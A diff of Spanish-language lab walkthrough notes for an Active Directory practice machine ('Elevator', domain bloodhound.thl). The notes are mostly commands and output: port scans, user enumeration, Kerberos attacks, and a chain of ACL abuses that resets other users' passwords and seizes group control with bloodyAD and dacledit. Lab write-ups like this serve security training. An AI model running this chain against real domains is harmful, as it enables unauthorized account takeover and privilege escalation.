@@ -1,12 +1,12 @@
-sudo nmap -sS --min-rate 5000 -p- --open -n -Pn 192.168.56.105 -oN scan.txt
+sudo nmap -sS --min-rate 5000 -p- --open -n -Pn 192.168.56.4 -oN scan.txt
 
 
 
-└─$ sudo nmap -sS --min-rate 5000 -p- --open -n -Pn 192.168.56.105 -oN scan.txt
+└─$ sudo nmap -sS --min-rate 5000 -p- --open -n -Pn 192.168.56.4 -oN scan.txt
 
 [sudo] password for kali: 
 Starting Nmap 7.95 ( https://nmap.org ) at 2025-09-05 15:59 EDT
-Nmap scan report for 192.168.56.105
+Nmap scan report for 192.168.56.4
 Host is up (0.00065s latency).
 Not shown: 65513 filtered tcp ports (no-response)
 Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
@@ -41,23 +41,21 @@ Nmap done: 1 IP address (1 host up) scanned in 26.57 seconds
 └─$ 
 
 
-
-------------------------------------------------------------------------
+------------------------------------------------------------------------------------------------------------------------------------------------
 grep '^[0-9]' scan.txt | cut -d '/' -f1 | sort -u | xargs | tr ' ' ','
 
 
 
+------------------------------------------------------------------------------------------------------------------------------------------------
 
-------------------------------------------------------------------------
-
-nmap -p135,139,3268,3269,389,445,464,49664,49668,49670,49671,49676,49683,49688,49704,53,593,5985,636,80,88,9389 -sV -sC -Pn -vvv -n 192.168.56.105 -oN fullScan.txt 
-
+nmap -p135,139,3268,3269,389,445,464,49664,49668,49670,49671,49676,49683,49688,49704,53,593,5985,636,80,88,9389 -sV -sC -Pn -vvv -n 192.168.56.4 -oN fullScan.txt 
 
 
 
 
 
-─$ nmap -p135,139,3268,3269,389,445,464,49664,49668,49670,49671,49676,49683,49688,49704,53,593,5985,636,80,88,9389 -sV -sC -Pn -vvv -n 192.168.56.105 -oN fullScan.txt 
+
+─$ nmap -p135,139,3268,3269,389,445,464,49664,49668,49670,49671,49676,49683,49688,49704,53,593,5985,636,80,88,9389 -sV -sC -Pn -vvv -n 192.168.56.4 -oN fullScan.txt 
 Starting Nmap 7.95 ( https://nmap.org ) at 2025-09-05 16:01 EDT
 NSE: Loaded 157 scripts for scanning.
 NSE: Script Pre-scanning.
@@ -71,10 +69,10 @@ NSE: Starting runlevel 3 (of 3) scan.
 Initiating NSE at 16:01
 Completed NSE at 16:01, 0.00s elapsed
 Initiating ARP Ping Scan at 16:01
-Scanning 192.168.56.105 [1 port]
+Scanning 192.168.56.4 [1 port]
 Completed ARP Ping Scan at 16:01, 0.05s elapsed (1 total hosts)
 Initiating SYN Stealth Scan at 16:01
-Scanning 192.168.56.105 [22 ports]
+Scanning 192.168.56.4 [22 ports]
 
 PORT      STATE SERVICE       REASON          VERSION
 53/tcp    open  domain        syn-ack ttl 128 Simple DNS Plus
@@ -151,26 +149,26 @@ Service detection performed. Please report any incorrect results at https://nmap
 Nmap done: 1 IP address (1 host up) scanned in 94.39 seconds
            Raw packets sent: 23 (996B) | Rcvd: 23 (996B)
                                                                                                                                                                                                                                                            
-
-------------------------------------------------------------------------
+------------------------------------------------------------------------------------------------------------------------------------------------
 ┌──(kali㉿kali)-[~/Documents/elevator]
-└─$ netexec smb 192.168.56.105                                
-SMB         192.168.56.105  445    ELEVATOR         [*] Windows Server 2022 Build 20348 x64 (name:ELEVATOR) (domain:bloodhound.thl) (signing:True) (SMBv1:False) 
-                                                                                                                                                                                                    
+└─$ netexec smb 192.168.56.4                                
+SMB         192.168.56.4  445    ELEVATOR         [*] Windows Server 2022 Build 20348 x64 (name:ELEVATOR) (domain:bloodhound.thl) (signing:True) (SMBv1:False) 
 
-------------------------------------------------------------------------
+
+
+------------------------------------------------------------------------------------------------------------------------------------------------
 john.smith
 Rk436\#Z4&
 
 
 
 
-rpcclient -U 'john.smith%Rk436\#Z4&' 192.168.56.105 
+rpcclient -U 'john.smith%Rk436\#Z4&' 192.168.56.4 
 
 
 
 ┌──(kali㉿kali)-[~/Documents/elevator]
-└─$ rpcclient -U 'john.smith%Rk436\#Z4&' 192.168.56.105
+└─$ rpcclient -U 'john.smith%Rk436\#Z4&' 192.168.56.4
 rpcclient $> enumdomusers
 user:[Administrador] rid:[0x1f4]
 user:[Invitado] rid:[0x1f5]
@@ -192,103 +190,80 @@ cat userK.txt | grep -oP '(?<=\[).*?(?=\])' | grep -v "0x" > usuarios_limpios.tx
 
 
 ┌──(kali㉿kali)-[~/Documents/elevator/elevator-docker]
-└─$ netexec smb 192.168.56.105  -u 'john.smith' -p 'Rk436\#Z4&' --rid-brute                   
-SMB         192.168.56.105  445    ELEVATOR         [*] Windows Server 2022 Build 20348 x64 (name:ELEVATOR) (domain:bloodhound.thl) (signing:True) (SMBv1:False) 
-SMB         192.168.56.105  445    ELEVATOR         [+] bloodhound.thl\john.smith:Rk436\#Z4& 
-SMB         192.168.56.105  445    ELEVATOR         498: BLOODHOUND\Enterprise Domain Controllers de sólo lectura (SidTypeGroup)
-SMB         192.168.56.105  445    ELEVATOR         500: BLOODHOUND\Administrador (SidTypeUser)
-SMB         192.168.56.105  445    ELEVATOR         501: BLOODHOUND\Invitado (SidTypeUser)
-SMB         192.168.56.105  445    ELEVATOR         502: BLOODHOUND\krbtgt (SidTypeUser)
-SMB         192.168.56.105  445    ELEVATOR         512: BLOODHOUND\Admins. del dominio (SidTypeGroup)
-SMB         192.168.56.105  445    ELEVATOR         513: BLOODHOUND\Usuarios del dominio (SidTypeGroup)
-SMB         192.168.56.105  445    ELEVATOR         514: BLOODHOUND\Invitados del dominio (SidTypeGroup)
-SMB         192.168.56.105  445    ELEVATOR         515: BLOODHOUND\Equipos del dominio (SidTypeGroup)
-SMB         192.168.56.105  445    ELEVATOR         516: BLOODHOUND\Controladores de dominio (SidTypeGroup)
-SMB         192.168.56.105  445    ELEVATOR         517: BLOODHOUND\Publicadores de certificados (SidTypeAlias)
-SMB         192.168.56.105  445    ELEVATOR         518: BLOODHOUND\Administradores de esquema (SidTypeGroup)
-SMB         192.168.56.105  445    ELEVATOR         519: BLOODHOUND\Administradores de empresas (SidTypeGroup)
-SMB         192.168.56.105  445    ELEVATOR         520: BLOODHOUND\Propietarios del creador de directivas de grupo (SidTypeGroup)
-SMB         192.168.56.105  445    ELEVATOR         521: BLOODHOUND\Controladores de dominio de sólo lectura (SidTypeGroup)
-SMB         192.168.56.105  445    ELEVATOR         522: BLOODHOUND\Controladores de dominio clonables (SidTypeGroup)
-SMB         192.168.56.105  445    ELEVATOR         525: BLOODHOUND\Protected Users (SidTypeGroup)
-SMB         192.168.56.105  445    ELEVATOR         526: BLOODHOUND\Administradores clave (SidTypeGroup)
-SMB         192.168.56.105  445    ELEVATOR         527: BLOODHOUND\Administradores clave de la organización (SidTypeGroup)
-SMB         192.168.56.105  445    ELEVATOR         553: BLOODHOUND\Servidores RAS e IAS (SidTypeAlias)
-SMB         192.168.56.105  445    ELEVATOR         571: BLOODHOUND\Grupo de replicación de contraseña RODC permitida (SidTypeAlias)
-SMB         192.168.56.105  445    ELEVATOR         572: BLOODHOUND\Grupo de replicación de contraseña RODC denegada (SidTypeAlias)
-SMB         192.168.56.105  445    ELEVATOR         1000: BLOODHOUND\ELEVATOR$ (SidTypeUser)
-SMB         192.168.56.105  445    ELEVATOR         1101: BLOODHOUND\DnsAdmins (SidTypeAlias)
-SMB         192.168.56.105  445    ELEVATOR         1102: BLOODHOUND\DnsUpdateProxy (SidTypeGroup)
-SMB         192.168.56.105  445    ELEVATOR         1103: BLOODHOUND\Usuarios de DHCP (SidTypeAlias)
-SMB         192.168.56.105  445    ELEVATOR         1104: BLOODHOUND\Administradores de DHCP (SidTypeAlias)
-SMB         192.168.56.105  445    ELEVATOR         1108: BLOODHOUND\michael.jones (SidTypeUser)
-SMB         192.168.56.105  445    ELEVATOR         1109: BLOODHOUND\john.smith (SidTypeUser)
-SMB         192.168.56.105  445    ELEVATOR         1110: BLOODHOUND\finanzas (SidTypeGroup)
-SMB         192.168.56.105  445    ELEVATOR         1111: BLOODHOUND\mary.johnson (SidTypeUser)
-SMB         192.168.56.105  445    ELEVATOR         1112: BLOODHOUND\robert.williams (SidTypeUser)
-SMB         192.168.56.105  445    ELEVATOR         1113: BLOODHOUND\marketing (SidTypeGroup)
-SMB         192.168.56.105  445    ELEVATOR         1114: BLOODHOUND\patricia.brown (SidTypeUser)
-SMB         192.168.56.105  445    ELEVATOR         1115: BLOODHOUND\operaciones (SidTypeGroup)
+└─$ netexec smb 192.168.56.4  -u 'john.smith' -p 'Rk436\#Z4&' --rid-brute                   
+SMB         192.168.56.4  445    ELEVATOR         [*] Windows Server 2022 Build 20348 x64 (name:ELEVATOR) (domain:bloodhound.thl) (signing:True) (SMBv1:False) 
+SMB         192.168.56.4  445    ELEVATOR         [+] bloodhound.thl\john.smith:Rk436\#Z4& 
+SMB         192.168.56.4  445    ELEVATOR         498: BLOODHOUND\Enterprise Domain Controllers de sólo lectura (SidTypeGroup)
+SMB         192.168.56.4  445    ELEVATOR         500: BLOODHOUND\Administrador (SidTypeUser)
+SMB         192.168.56.4  445    ELEVATOR         501: BLOODHOUND\Invitado (SidTypeUser)
+SMB         192.168.56.4  445    ELEVATOR         502: BLOODHOUND\krbtgt (SidTypeUser)
+SMB         192.168.56.4  445    ELEVATOR         512: BLOODHOUND\Admins. del dominio (SidTypeGroup)
+SMB         192.168.56.4  445    ELEVATOR         513: BLOODHOUND\Usuarios del dominio (SidTypeGroup)
+SMB         192.168.56.4  445    ELEVATOR         514: BLOODHOUND\Invitados del dominio (SidTypeGroup)
+SMB         192.168.56.4  445    ELEVATOR         515: BLOODHOUND\Equipos del dominio (SidTypeGroup)
+SMB         192.168.56.4  445    ELEVATOR         516: BLOODHOUND\Controladores de dominio (SidTypeGroup)
+SMB         192.168.56.4  445    ELEVATOR         517: BLOODHOUND\Publicadores de certificados (SidTypeAlias)
+SMB         192.168.56.4  445    ELEVATOR         518: BLOODHOUND\Administradores de esquema (SidTypeGroup)
+SMB         192.168.56.4  445    ELEVATOR         519: BLOODHOUND\Administradores de empresas (SidTypeGroup)
+SMB         192.168.56.4  445    ELEVATOR         520: BLOODHOUND\Propietarios del creador de directivas de grupo (SidTypeGroup)
+SMB         192.168.56.4  445    ELEVATOR         521: BLOODHOUND\Controladores de dominio de sólo lectura (SidTypeGroup)
+SMB         192.168.56.4  445    ELEVATOR         522: BLOODHOUND\Controladores de dominio clonables (SidTypeGroup)
+SMB         192.168.56.4  445    ELEVATOR         525: BLOODHOUND\Protected Users (SidTypeGroup)
+SMB         192.168.56.4  445    ELEVATOR         526: BLOODHOUND\Administradores clave (SidTypeGroup)
+SMB         192.168.56.4  445    ELEVATOR         527: BLOODHOUND\Administradores clave de la organización (SidTypeGroup)
+SMB         192.168.56.4  445    ELEVATOR         553: BLOODHOUND\Servidores RAS e IAS (SidTypeAlias)
+SMB         192.168.56.4  445    ELEVATOR         571: BLOODHOUND\Grupo de replicación de contraseña RODC permitida (SidTypeAlias)
+SMB         192.168.56.4  445    ELEVATOR         572: BLOODHOUND\Grupo de replicación de contraseña RODC denegada (SidTypeAlias)
+SMB         192.168.56.4  445    ELEVATOR         1000: BLOODHOUND\ELEVATOR$ (SidTypeUser)
+SMB         192.168.56.4  445    ELEVATOR         1101: BLOODHOUND\DnsAdmins (SidTypeAlias)
+SMB         192.168.56.4  445    ELEVATOR         1102: BLOODHOUND\DnsUpdateProxy (SidTypeGroup)
+SMB         192.168.56.4  445    ELEVATOR         1103: BLOODHOUND\Usuarios de DHCP (SidTypeAlias)
+SMB         192.168.56.4  445    ELEVATOR         1104: BLOODHOUND\Administradores de DHCP (SidTypeAlias)
+SMB         192.168.56.4  445    ELEVATOR         1108: BLOODHOUND\michael.jones (SidTypeUser)
+SMB         192.168.56.4  445    ELEVATOR         1109: BLOODHOUND\john.smith (SidTypeUser)
+SMB         192.168.56.4  445    ELEVATOR         1110: BLOODHOUND\finanzas (SidTypeGroup)
+SMB         192.168.56.4  445    ELEVATOR         1111: BLOODHOUND\mary.johnson (SidTypeUser)
+SMB         192.168.56.4  445    ELEVATOR         1112: BLOODHOUND\robert.williams (SidTypeUser)
+SMB         192.168.56.4  445    ELEVATOR         1113: BLOODHOUND\marketing (SidTypeGroup)
+SMB         192.168.56.4  445    ELEVATOR         1114: BLOODHOUND\patricia.brown (SidTypeUser)
+SMB         192.168.56.4  445    ELEVATOR         1115: BLOODHOUND\operaciones (SidTypeGroup)
                                                                                                                                                                                                                                                            
-┌──(kali㉿kali)-[~/Documents/elevator/elevator-docker]
-└─$ netexec smb 192.168.56.105  -u 'john.smith' -p 'Rk436\#Z4&' --rid-brute
-SMB         192.168.56.105  445    ELEVATOR         [*] Windows Server 2022 Build 20348 x64 (name:ELEVATOR) (domain:bloodhound.thl) (signing:True) (SMBv1:False) 
-SMB         192.168.56.105  445    ELEVATOR         [+] bloodhound.thl\john.smith:Rk436\#Z4& 
-SMB         192.168.56.105  445    ELEVATOR         498: BLOODHOUND\Enterprise Domain Controllers de sólo lectura (SidTypeGroup)
-SMB         192.168.56.105  445    ELEVATOR         500: BLOODHOUND\Administrador (SidTypeUser)
-SMB         192.168.56.105  445    ELEVATOR         501: BLOODHOUND\Invitado (SidTypeUser)
-SMB         192.168.56.105  445    ELEVATOR         502: BLOODHOUND\krbtgt (SidTypeUser)
-SMB         192.168.56.105  445    ELEVATOR         512: BLOODHOUND\Admins. del dominio (SidTypeGroup)
-SMB         192.168.56.105  445    ELEVATOR         513: BLOODHOUND\Usuarios del dominio (SidTypeGroup)
-SMB         192.168.56.105  445    ELEVATOR         514: BLOODHOUND\Invitados del dominio (SidTypeGroup)
-SMB         192.168.56.105  445    ELEVATOR         515: BLOODHOUND\Equipos del dominio (SidTypeGroup)
-SMB         192.168.56.105  445    ELEVATOR         516: BLOODHOUND\Controladores de dominio (SidTypeGroup)
-SMB         192.168.56.105  445    ELEVATOR         517: BLOODHOUND\Publicadores de certificados (SidTypeAlias)
-SMB         192.168.56.105  445    ELEVATOR         518: BLOODHOUND\Administradores de esquema (SidTypeGroup)
-SMB         192.168.56.105  445    ELEVATOR         519: BLOODHOUND\Administradores de empresas (SidTypeGroup)
-SMB         192.168.56.105  445    ELEVATOR         520: BLOODHOUND\Propietarios del creador de directivas de grupo (SidTypeGroup)
-SMB         192.168.56.105  445    ELEVATOR         521: BLOODHOUND\Controladores de dominio de sólo lectura (SidTypeGroup)
-SMB         192.168.56.105  445    ELEVATOR         522: BLOODHOUND\Controladores de dominio clonables (SidTypeGroup)
-SMB         192.168.56.105  445    ELEVATOR         525: BLOODHOUND\Protected Users (SidTypeGroup)
-SMB         192.168.56.105  445    ELEVATOR         526: BLOODHOUND\Administradores clave (SidTypeGroup)
-SMB         192.168.56.105  445    ELEVATOR         527: BLOODHOUND\Administradores clave de la organización (SidTypeGroup)
-SMB         192.168.56.105  445    ELEVATOR         553: BLOODHOUND\Servidores RAS e IAS (SidTypeAlias)
-SMB         192.168.56.105  445    ELEVATOR         571: BLOODHOUND\Grupo de replicación de contraseña RODC permitida (SidTypeAlias)
-SMB         192.168.56.105  445    ELEVATOR         572: BLOODHOUND\Grupo de replicación de contraseña RODC denegada (SidTypeAlias)
-SMB         192.168.56.105  445    ELEVATOR         1000: BLOODHOUND\ELEVATOR$ (SidTypeUser)
-SMB         192.168.56.105  445    ELEVATOR         1101: BLOODHOUND\DnsAdmins (SidTypeAlias)
-SMB         192.168.56.105  445    ELEVATOR         1102: BLOODHOUND\DnsUpdateProxy (SidTypeGroup)
-SMB         192.168.56.105  445    ELEVATOR         1103: BLOODHOUND\Usuarios de DHCP (SidTypeAlias)
-SMB         192.168.56.105  445    ELEVATOR         1104: BLOODHOUND\Administradores de DHCP (SidTypeAlias)
-SMB         192.168.56.105  445    ELEVATOR         1108: BLOODHOUND\michael.jones (SidTypeUser)
-SMB         192.168.56.105  445    ELEVATOR         1109: BLOODHOUND\john.smith (SidTypeUser)
-SMB         192.168.56.105  445    ELEVATOR         1110: BLOODHOUND\finanzas (SidTypeGroup)
-SMB         192.168.56.105  445    ELEVATOR         1111: BLOODHOUND\mary.johnson (SidTypeUser)
-SMB         192.168.56.105  445    ELEVATOR         1112: BLOODHOUND\robert.williams (SidTypeUser)
-SMB         192.168.56.105  445    ELEVATOR         1113: BLOODHOUND\marketing (SidTypeGroup)
-SMB         192.168.56.105  445    ELEVATOR         1114: BLOODHOUND\patricia.brown (SidTypeUser)
-SMB         192.168.56.105  445    ELEVATOR         1115: BLOODHOUND\operaciones (SidTypeGroup)
-                                                                                                                                                                                                                                                           
-┌──(kali㉿kali)-[~/Documents/elevator/elevator-docker]
-└─$ netexec smb 192.168.56.105  -u 'john.smith' -p 'Rk436\#Z4&' --rid-brute | grep SidTypeUser
-SMB                      192.168.56.105  445    ELEVATOR         500: BLOODHOUND\Administrador (SidTypeUser)
-SMB                      192.168.56.105  445    ELEVATOR         501: BLOODHOUND\Invitado (SidTypeUser)
-SMB                      192.168.56.105  445    ELEVATOR         502: BLOODHOUND\krbtgt (SidTypeUser)
-SMB                      192.168.56.105  445    ELEVATOR         1000: BLOODHOUND\ELEVATOR$ (SidTypeUser)
-SMB                      192.168.56.105  445    ELEVATOR         1108: BLOODHOUND\michael.jones (SidTypeUser)
-SMB                      192.168.56.105  445    ELEVATOR         1109: BLOODHOUND\john.smith (SidTypeUser)
-SMB                      192.168.56.105  445    ELEVATOR         1111: BLOODHOUND\mary.johnson (SidTypeUser)
-SMB                      192.168.56.105  445    ELEVATOR         1112: BLOODHOUND\robert.williams (SidTypeUser)
-SMB                      192.168.56.105  445    ELEVATOR         1114: BLOODHOUND\patricia.brown (SidTypeUser)
 
 
-------------------------------------------------------------------------
+
+
+                                                                                                                                                                                                                                                           
+┌──(kali㉿kali)-[~/Documents/elevator/elevator-docker]
+└─$ netexec smb 192.168.56.4  -u 'john.smith' -p 'Rk436\#Z4&' --rid-brute | grep SidTypeUser
+SMB                      192.168.56.4  445    ELEVATOR         500: BLOODHOUND\Administrador (SidTypeUser)
+SMB                      192.168.56.4  445    ELEVATOR         501: BLOODHOUND\Invitado (SidTypeUser)
+SMB                      192.168.56.4  445    ELEVATOR         502: BLOODHOUND\krbtgt (SidTypeUser)
+SMB                      192.168.56.4  445    ELEVATOR         1000: BLOODHOUND\ELEVATOR$ (SidTypeUser)
+SMB                      192.168.56.4  445    ELEVATOR         1108: BLOODHOUND\michael.jones (SidTypeUser)
+SMB                      192.168.56.4  445    ELEVATOR         1109: BLOODHOUND\john.smith (SidTypeUser)
+SMB                      192.168.56.4  445    ELEVATOR         1111: BLOODHOUND\mary.johnson (SidTypeUser)
+SMB                      192.168.56.4  445    ELEVATOR         1112: BLOODHOUND\robert.williams (SidTypeUser)
+SMB                      192.168.56.4  445    ELEVATOR         1114: BLOODHOUND\patricia.brown (SidTypeUser)
+
+
+
+
+
+
+
 
 
 impacket-GetNPUsers -usersfile usuarios_limpios.txt -no-pass bloodhound.thl/  
 
 
- kerbrute userenum --dc bloodhound.thl -d bloodhound.thl usuarios_limpios.txt   
+
+
+
+
+
+
+
+kerbrute userenum --dc bloodhound.thl -d bloodhound.thl usuarios_limpios.txt   
 
 
 
@@ -313,27 +288,25 @@ Version: v1.0.3 (9dad6e1) - 09/05/25 - Ronnie Flathers @ropnop
 2025/09/05 16:18:01 >  [+] VALID USERNAME:       michael.jones@bloodhound.thl
 2025/09/05 16:18:01 >  Done! Tested 8 usernames (6 valid) in 0.002 seconds
                                                                                                                                                                                                                                                             
-
-------------------------------------------------------------------------
+------------------------------------------------------------------------------------------------------------------------------------------------
 
 
 impacket-GetUserSPNs bloodhound.thl/john.smith:'Rk436\#Z4&' -request
 
 
-netexec winrm -i 192.168.56.105 -u john.smith -p 'Rk436\#Z4&'
+netexec winrm -i 192.168.56.4 -u john.smith -p 'Rk436\#Z4&'
 
 
 
-smbmap -H  192.168.56.105 -u john.smith -p 'Rk436\#Z4&'
+smbmap -H  192.168.56.4 -u john.smith -p 'Rk436\#Z4&'
 
 
-netexec smb  192.168.56.105 -u john.smith -p 'Rk436\#Z4&' --shares
+netexec smb  192.168.56.4 -u john.smith -p 'Rk436\#Z4&' --shares
 
 
 
-netexec smb 192.168.56.105  -u 'john.smith' -p 'Rk436\#Z4&' --rid-brute | grep SidTypeUser
-
-------------------------------------------------------------------------
+netexec smb 192.168.56.4  -u 'john.smith' -p 'Rk436\#Z4&' --rid-brute | grep SidTypeUser
+------------------------------------------------------------------------------------------------------------------------------------------------
 
 sudo apt-get install dnsmasq
                                                                                                                                                                                                                                                            
@@ -341,8 +314,11 @@ nano /etc/dnsmasq.conf
 
 address=/ELEVATOR.bloodhound.thl/192.168.56.103
 
- systemctl restart dnsmasq  
-------------------------------------------------------------------------
+ systemctl restart dnsmasq 
+
+
+
+ 
 
 
 
@@ -350,7 +326,16 @@ bloodhound-python -u 'john.smith' -p 'Rk436\#Z4&' -d bloodhound.thl -dc ELEVATOR
 
 
 
-------------------------------------------------------------------------
+
+
+
+
+
+
+------------------------------------------------------------------------------------------------------------------------------------------------
+
+## Con bloodhound Descubrimos que se Permitir john.smith Agrégate a Finanzas Agrupar en
+
 
 
 # Agregamos al usuario john.smith al grupo de FINANZAS
@@ -372,12 +357,23 @@ group:[DnsUpdateProxy] rid:[0x44e]
 group:[finanzas] rid:[0x456]
 
 
+
 ## Antes de Agregar
 rpcclient $> querygroupmem 0x456
+
+
+
+
 
 ### Agregamos al usuario john.smith
 
 bloodyAD --host dc.bloodhound.thl -d bloodhound.thl -u 'john.smith' -p 'Rk436\#Z4&' add groupMember FINANZAS john.smith
+
+
+
+bloodyAD -d 'bloodhound.thl' --dc-ip 192.168.56.4 -u 'john.smith' -p 'Rk436\#Z4&' add groupMember FINANZAS john.smith
+
+
 
 
 ## Despues de agregar de Agregar
@@ -391,41 +387,57 @@ rpcclient $> queryuser 0x455
         Dir Drive   :
         user_rid :      0x455
 
-------------------------------------------------------------------------
-
-## Ahora el grupo Finanzas tiene privilegios sobre los usuario de mary.johnson
 
 
-net rpc password "mary.johnson" "Patito12345" -U "bloodhound.thl"/"john.smith"%"Rk436\#Z4&" -S 192.168.56.105
+------------------------------------------------------------------------------------------------------------------------------------------------
 
-
----bloodyAD --host dc.bloodhound.thl -d bloodhound.thl -u 'john.smith' -p 'Rk436\#Z4&' set password MARY.JOHNSON Abc123456@    
+# Forzar cambio de contraseña
 
 
 
-netexec smb 192.168.56.105 -u mary.johnson -p 'Patito12345'
+## Ahora el grupo Finanzas tiene privilegios Los usuarios tienen GenericAll Permisos  sobre los usuario de mary.johnson
 
-SMB         192.168.56.105  445    ELEVATOR         [*] Windows Server 2022 Build 20348 x64 (name:ELEVATOR) (domain:bloodhound.thl) (signing:True) (SMBv1:False) 
-SMB         192.168.56.105  445    ELEVATOR         [+] bloodhound.thl\mary.johnson:Patito12345 
-                                                                                                                                                                                                                                                  
 
-------------------------------------------------------------------------
+- net rpc password "mary.johnson" "Patito12345" -U "bloodhound.thl"/"john.smith"%"Rk436\#Z4&" -S 192.168.56.4
+
+- bloodyAD --host dc.bloodhound.thl -d bloodhound.thl -u 'john.smith' -p 'Rk436\#Z4&' set password MARY.JOHNSON 'Patito12345' 
+
+- bloodyAD -d 'bloodhound.thl' --dc-ip 192.168.56.4 -u 'john.smith' -p 'Rk436\#Z4&' set password mary.johnson 'Patito12345'
+
+
+
+
+
+- netexec smb 192.168.56.4 -u mary.johnson -p 'Patito12345'
+
+SMB         192.168.56.4  445    ELEVATOR         [*] Windows Server 2022 Build 20348 x64 (name:ELEVATOR) (domain:bloodhound.thl) (signing:True) (SMBv1:False) 
+SMB         192.168.56.4  445    ELEVATOR         [+] bloodhound.thl\mary.johnson:Patito12345 
+
+
+
+------------------------------------------------------------------------------------------------------------------------------------------------
+
+
+
 ## Ahora mary.johnson tiene privilegios para cambiar la contrasena al usuario robert.williams
 
 
-net rpc password "robert.williams" "Patito12345" -U "bloodhound.thl"/"mary.johnson"%"Patito12345" -S 192.168.56.105
+- net rpc password "robert.williams" "Patito12345" -U "bloodhound.thl"/"mary.johnson"%"Patito12345" -S 192.168.56.4
+
+- bloodyAD -d 'bloodhound.thl' --dc-ip 192.168.56.4 -u 'mary.johnson' -p 'Patito12345' set password ROBERT.WILLIAMS Patito12345
 
 
 
-netexec smb 192.168.56.105 -u robert.williams -p 'Patito12345'
+- netexec smb 192.168.56.4 -u robert.williams -p 'Patito12345'
 
-└─$ netexec smb 192.168.56.105 -u robert.williams -p 'Patito12345'                                                      
 
-SMB         192.168.56.105  445    ELEVATOR         [*] Windows Server 2022 Build 20348 x64 (name:ELEVATOR) (domain:bloodhound.thl) (signing:True) (SMBv1:False) 
-SMB         192.168.56.105  445    ELEVATOR         [+] bloodhound.thl\robert.williams:Patito12345 
+SMB         192.168.56.4  445    ELEVATOR         [*] Windows Server 2022 Build 20348 x64 (name:ELEVATOR) (domain:bloodhound.thl) (signing:True) (SMBv1:False) 
+SMB         192.168.56.4  445    ELEVATOR         [+] bloodhound.thl\robert.williams:Patito12345 
                                                                                                     
+------------------------------------------------------------------------------------------------------------------------------------------------
 
-------------------------------------------------------------------------
+# Abuso de WriteDACL
+
 
 ## En el grupo de MARKETING esta el usuario   robert.williams
 
@@ -444,28 +456,63 @@ rpcclient $> queryuser 0x458
 
 
 
+## ROBERT.WILLIAMS Posee PATRICIA.BROWN De WriteDacl Permisos
+
+- bloodyAD -d 'bloodhound.thl' --dc-ip 192.168.56.4 -u 'robert.williams' -p 'Patito12345' get writable
+ 
+ ```
+distinguishedName: CN=S-1-5-11,CN=ForeignSecurityPrincipals,DC=bloodhound,DC=thl
+permission: WRITE
+
+distinguishedName: CN=Robert Williams,OU=marketing,DC=bloodhound,DC=thl
+permission: WRITE
+
+distinguishedName: CN=Patricia Brown,CN=Users,DC=bloodhound,DC=thl
+DACL: WRITE
+```
 
 
-impacket-dacledit -action 'write' -rights 'FullControl' -principal 'robert.williams' -target 'patricia.brown' 'bloodhound.thl/robert.williams:Patito12345'
+        - impacket-dacledit -action 'write' -rights 'FullControl' -principal 'robert.williams' -target 'patricia.brown' 'bloodhound.thl/robert.williams:Patito12345'
 
-Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
-[*] DACL backed up to dacledit-20250905-194526.bak
-[*] DACL modified successfully!
-                                                                                                                                                                                                         
+        Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
+        [*] DACL backed up to dacledit-20250905-194526.bak
+        [*] DACL modified successfully!
+                                                                                                                                                          
+                                                                                                                                                          
+## Para abusar de WriteDacl en objetos de usuario, puede darse permisos GenericAll
+
+- bloodyAD -d 'bloodhound.thl' --dc-ip 192.168.56.4 -u 'ROBERT.WILLIAMS' -p 'Patito12345' add genericAll PATRICIA.BROWN ROBERT.WILLIAMS
+
+ [+] ROBERT.WILLIAMS has now GenericAll on PATRICIA.BROWN
+                              
 
 
 ### Vamos a cambiarle de contrasena a PATRICIA
 
-net rpc password "patricia.brown" "Patito12345" -U "bloodhound.thl"/"robert.williams"%"Patito12345" -S 192.168.56.105
+- net rpc password "patricia.brown" "Patito12345" -U "bloodhound.thl"/"robert.williams"%"Patito12345" -S 192.168.56.4
+
+
+- bloodyAD -d 'bloodhound.thl' --dc-ip 192.168.56.4 -u 'ROBERT.WILLIAMS' -p 'Patito12345' set password PATRICIA.BROWN Patito12345
+
+[+] Password changed successfully!
 
 
 
-netexec smb 192.168.56.105 -u patricia.brown -p 'Patito12345' 
+
+
+netexec smb 192.168.56.4 -u patricia.brown -p 'Patito12345' 
 
 
 
 
-------------------------------------------------------------------------
+
+
+------------------------------------------------------------------------------------------------------------------------------------------------
+
+
+# ADDSelf-2
+
+Usuarios PATRICIA.BROWN@BLOODHOUND.THL Con derecho a modificar el grupo OPERACIONES@BLOODHOUND.THL El propietario
 
 
 ### PATRICIA.BROWN se convierta en la propietaria del grupo OPERACIONES.
@@ -492,102 +539,93 @@ Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies
 
 
 
-
 ### Este comando modifica la ACL del grupo OPERACIONES y le da a  patricia.brown el permiso de agregar o quitar miembros del grupo.
 
 
-impacket-dacledit -action 'write' -rights 'WriteMembers' -principal 'patricia.brown' -target-dn 'CN=OPERACIONES,OU=OPERACIONES,DC=bloodhound,DC=thl'  'bloodhound.thl/patricia.brown:Patito12345'
+- bloodyAD -d 'bloodhound.thl' --dc-ip 192.168.56.4 -u 'PATRICIA.BROWN' -p 'Patito12345' set owner OPERACIONES PATRICIA.BROWN
 
+        - dacledit.py -action 'write' -rights 'WriteMembers' -principal 'PATRICIA.BROWN' -target-dn 'CN=OPERACIONES,OU=OPERACIONES,DC=BLOODHOUND,DC=THL' 'bloodhound.thl'/'PATRICIA.BROWN':'Patito12345'
 
-==== impacket-dacledit -action write -rights WriteMembers -principal 'PATRICIA.BROWN' -target-dn 'CN=OPERACIONES,OU=OPERACIONES,DC=bloodhound,DC=thl' 'bloodhound.thl/PATRICIA.BROWN:Patito12345'
-
-==== impacket-dacledit -action write -rights WriteMembers -principal 'patricia.brown'  -target-dn 'CN=OPERACIONES,OU=OPERACIONES,DC=BLOODHOUND,DC=THL'  'bloodhound.thl/PATRICIA.BROWN:Abc123456@'
-
-
-Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
-
-[*] DACL backed up to dacledit-20250905-195515.bak
-[*] DACL modified successfully!
+       - impacket-dacledit -action 'write' -rights 'WriteMembers' -principal 'PATRICIA.BROWN' -target-dn 'CN=OPERACIONES,OU=OPERACIONES,DC=BLOODHOUND,DC=THL' 'bloodhound.thl'/'PATRICIA.BROWN':'Patito12345'
 
 
 
-# A partir de este momento, PATRICIA.BROWN puede meterse a sí misma (o a cualquier otro usuario) dentro del grupo OPERACIONES.
-
-
